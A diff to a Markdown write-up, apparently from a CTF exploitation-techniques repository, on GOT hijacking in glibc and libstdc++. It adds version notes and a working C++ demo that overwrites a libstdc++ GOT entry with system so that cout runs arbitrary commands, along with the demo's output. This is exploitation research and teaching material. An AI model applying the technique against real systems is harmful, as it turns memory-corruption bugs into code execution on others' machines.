@@ -1,13 +1,16 @@
 # Libc-GOT-Hijacking 
 
-Important: You can only use this skill for glibcs < 2.39.
-
 Transform arbitrary write to RCE.
+
+Libc makes it full RELRO at 2.39 so this skill doesn't work for glibc-2.39+.
+However, it works for the libstdc++ on the latest Ubuntu LTS.
+
+
+## Details
 
 This is a userspace attacking skill: If you can write arbitrary memory space, you can use this method to execute arbitrary code. 
 
 > You only need to know the base address of Glibc
-> Glibc is FULL RELRO by default for glibc2.39. A great security improvement! We can't hijack Libc GOT on libc version >= 2.39
 
 # Update (Dec 17th., 2024)
 
@@ -25,6 +28,24 @@ While exploiting a CTF challenge, I found `libstdc++` is a juicy target of this 
 ```
 
 I'll provide a demo later. A simple way to get a shell is just to modify `del/new` got to `system` and `cin` the string `/bin/sh` (Kylebot told me people already found it even though they didn't show that publicly I just re-find this technique). But if ROP is what we want, aha, we can do libc-got-hijacking (even though it's unnecessary, it's a general solution!) 
+
+Here is a demo:
+```c
+[18:34:04] n132 :: xps  ➜  ~/demo » cat ./rce.cpp && g++ ./rce.cpp -o ./rce && echo "id" | ./rce
+#include <iostream>
+int main(){
+    // Hijack fwrite@got[plt] to system
+    // cout gonna run arbitrary commands
+    int num = 915;
+    std::string str;
+    size_t libc_base = (size_t)system-0x00058740;
+    size_t * add_of_del_got = (size_t *)(libc_base + 0x277000 + 0x400000 + num*8);
+    * add_of_del_got = (size_t )system;
+    std::cin >> str;
+    std::cout << str << std::endl;
+}
+uid=1000(n132) gid=1000(n132) groups=1000(n132),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)
+```
 
 ## glibc > 2.35 & glibc <=2.38
 
